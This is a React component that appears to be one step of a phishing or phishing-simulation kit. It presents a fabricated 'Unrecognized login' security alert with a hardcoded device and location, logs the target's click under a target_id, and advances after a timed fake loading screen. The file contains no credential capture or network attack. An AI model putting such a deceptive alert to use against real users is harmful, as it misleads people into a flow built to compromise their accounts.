import addIntakeEvent from "@/app/(tropic)/addIntakeEvent";
import { MdOutlineSmartphone } from "react-icons/md";
import proceedStep from "@/app/(tropic)/proceedStep";
import "./NewDevice.scss";
import { FaTimes } from "react-icons/fa";
import { FaCheck } from "react-icons/fa6";
import { getTargetId } from "@/app/(tropic)/getTargetId";

export default function NewDevice({ setParentLoading }) {
    async function handleResponse(response) {
        await addIntakeEvent({
            type: 'interaction',
            interaction_title: `Clicked new device ${response}`,
            target_id: await getTargetId(),
        })
        setParentLoading(true);
        setTimeout(() => {
            proceedStep();
        }, 3700)
        setTimeout(() => {
            setParentLoading(false);
        }, 3900)
    }
    return (
        <div className="Main NewDevice">
            <h2>Unrecognized login</h2>
            <div className="card">
                <p>
                    We noticed a login attempt on your account from an unrecognized device.
                </p>
                <p>
                    To help us protect your account, please review the details:
                </p>
                <div className="deviceInfo">
                    <MdOutlineSmartphone color="rgb(18, 18, 18)"
                        size={'58px'}
                    />
                    <div className="text">
                        <span>Samsung Galaxy A54</span>
                        <span>
                            Browser: Chrome 133.0
                        </span>
                        <span>
                            Near Sparta, NC, USA
                        </span>
                    </div>
                </div>
                <p className="doYou">
                    Do you recognize this activity?
                </p>
                <button
                    onClick={() => handleResponse('authorized')}
                    className="yes">
                    <FaCheck />
                    <span>
                        Yes, it was me
                    </span>
                </button>
                <button
                    onClick={() => handleResponse('unauthorized')}
                    className="no">
                    <FaTimes className="tooSmall" />
                    <span>
                        No, secure account
                    </span>
                </button>
            </div>
        </div>
    )
}